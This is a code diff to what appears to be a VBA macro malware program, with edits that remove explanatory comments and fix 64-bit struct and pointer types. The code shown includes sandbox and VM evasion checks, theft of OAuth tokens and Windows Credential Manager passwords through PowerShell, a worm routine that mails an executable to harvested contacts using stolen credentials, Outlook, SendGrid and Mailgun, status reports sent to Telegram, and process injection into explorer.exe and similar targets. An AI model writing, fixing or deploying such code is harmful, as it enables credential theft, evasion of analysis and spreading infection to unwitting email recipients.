@@ -222,18 +222,27 @@ Private Type BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
     dwInfoVersion As Long
 #If VBA7 Then
     pbNonce As LongPtr
-    pbAuthData As LongPtr
-    pbTag As LongPtr
-    pbMacContext As LongPtr
 #Else
     pbNonce As Long
-    pbAuthData As Long
-    pbTag As Long
-    pbMacContext As Long
 #End If
     cbNonce As Long
+#If VBA7 Then
+    pbAuthData As LongPtr
+#Else
+    pbAuthData As Long
+#End If
     cbAuthData As Long
+#If VBA7 Then
+    pbTag As LongPtr
+#Else
+    pbTag As Long
+#End If
     cbTag As Long
+#If VBA7 Then
+    pbMacContext As LongPtr
+#Else
+    pbMacContext As Long
+#End If
     cbMacContext As Long
     cbAAD As Long
     cbData As Long
@@ -802,8 +811,7 @@ Function IsSandbox() As Boolean
     Dim procName As String
     Dim user As String
     Dim sandFiles As Variant
-    
-    ' Disk space check
+
     ret = GetDiskFreeSpaceExA("C:\", freeBytes, totalBytes, ByVal 0)
     minSize = 64 * 1024
     minSize = minSize * 1024
@@ -812,14 +820,10 @@ Function IsSandbox() As Boolean
         IsSandbox = True
         Exit Function
     End If
-    
-    ' Uptime check (at least 5 minutes)
     If GetTickCount() < 5 * 60 * 1000 Then
         IsSandbox = True
         Exit Function
     End If
-    
-    ' Process count (at least 20)
     snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
     If snap <> -1 Then
         pe.dwSize = Len(pe)
@@ -835,8 +839,6 @@ Function IsSandbox() As Boolean
             Exit Function
         End If
     End If
-    
-    ' Mouse movement
     If GetSystemMetrics(SM_MOUSEPRESENT) <> 0 Then
         GetCursorPos p1
         StealthSleep 100
@@ -846,15 +848,11 @@ Function IsSandbox() As Boolean
             Exit Function
         End If
     End If
-    
-    ' VM artifacts
     Set fso = CreateObject("Scripting.FileSystemObject")
     If fso.FileExists("C:\windows\system32\vmtools.dll") Or fso.FileExists("C:\windows\system32\vboxhook.dll") Then
         IsSandbox = True
         Exit Function
     End If
-    
-    ' VM processes
     vmProcs = Array("vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe", "VGAuthService.exe", "vmwareuser.exe", "qemu-ga.exe", "joeboxcontrol.exe", "cuckoo.exe")
     snap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
     If snap2 <> -1 Then
@@ -873,15 +871,11 @@ Function IsSandbox() As Boolean
         End If
         CloseHandle snap2
     End If
-    
-    ' Username
     user = LCase(Environ("USERNAME"))
     If InStr(user, "sandbox") > 0 Or InStr(user, "malware") > 0 Or InStr(user, "test") > 0 Or InStr(user, "analyst") > 0 Or InStr(user, "virus") > 0 Then
         IsSandbox = True
         Exit Function
     End If
-    
-    ' Sandbox files/folders
     sandFiles = Array("C:\sample.exe", "C:\tools\", "C:\analysis\", "C:\malware\")
     For Each f In sandFiles
         If fso.FileExists(f) Or fso.FolderExists(f) Then
@@ -1541,7 +1535,6 @@ Private Sub StealOAuthTokens()
             Next file
         End If
     Next b
-    ' Also steal tokens from Windows Credential Manager using PowerShell
     psScript = "$creds = @(); Get-StoredCredential | ForEach-Object { $creds += $_.UserName + '|' + $_.Password }; $creds -join '`n'"
     psFile = GetTempDir() & "creds.ps1"
     Set f = fso.CreateTextFile(psFile, True)
@@ -1783,7 +1776,7 @@ Private Sub HarvestAllEmailTargets()
 End Sub
 
 ' ============================================================
-' 14. EMAIL PROPAGATION (6 methods: Graph API, Gmail API, SendGrid, Mailgun, Outlook, Mailto)
+' 14. EMAIL PROPAGATION (6 methods)
 ' ============================================================
 Private Function SendEmailViaGraphAPI(toAddr As String, attachmentPath As String, accessToken As String) As Boolean
     On Error GoTo Fail
@@ -2032,7 +2025,6 @@ Private Sub WildfireEmailPropagation()
     sentCount = 0
     For Each target In g_emailTargets
         success = False
-        ' Try Graph API with stolen OAuth tokens first
         If Not g_stolenCredentials Is Nothing Then
             For Each cred In g_stolenCredentials
                 If Left(cred, 11) = "OAUTH_TOKEN|" Then
@@ -2050,7 +2042,6 @@ Private Sub WildfireEmailPropagation()
                 End If
             Next cred
         End If
-        ' Then try stolen SMTP credentials
         If Not success And Not g_stolenCredentials Is Nothing Then
             For Each cred In g_stolenCredentials
                 If InStr(cred, "|") > 0 And Left(cred, 11) <> "OAUTH_TOKEN|" Then
@@ -2062,7 +2053,6 @@ Private Sub WildfireEmailPropagation()
                 End If
             Next cred
         End If
-        ' Fallback to Outlook
         If Not success Then
             On Error Resume Next
             Set olApp = GetObject(, "Outlook.Application")
@@ -2078,21 +2068,18 @@ Private Sub WildfireEmailPropagation()
                 SendToTelegram "EMAIL_SENT|OUTLOOK| -> " & target
             End If
         End If
-        ' Fallback to SendGrid
         If Not success Then
             If SendEmailViaSendGrid(target, exePath) Then
                 success = True
                 SendToTelegram "EMAIL_SENT|SENDGRID| -> " & target
             End If
         End If
-        ' Fallback to Mailgun
         If Not success Then
             If SendEmailViaMailgun(target, exePath) Then
                 success = True
                 SendToTelegram "EMAIL_SENT|MAILGUN| -> " & target
             End If
         End If
-        ' Last resort: mailto
         If Not success Then
             SendEmailViaMailto target, exePath
             SendToTelegram "EMAIL_SENT|MAILTO| -> " & target
@@ -3403,7 +3390,7 @@ Private Sub InjectIntoProcess()
     Dim scHex As String
     Dim i As Long
     Dim j As Long
-    Dim allocSize As Long
+    Dim allocSize As LongPtr
     targetProcs = Array("notepad.exe", "explorer.exe", "RuntimeBroker.exe", "dllhost.exe")
     Randomize Timer
     idx = Int(Rnd * (UBound(targetProcs) + 1))
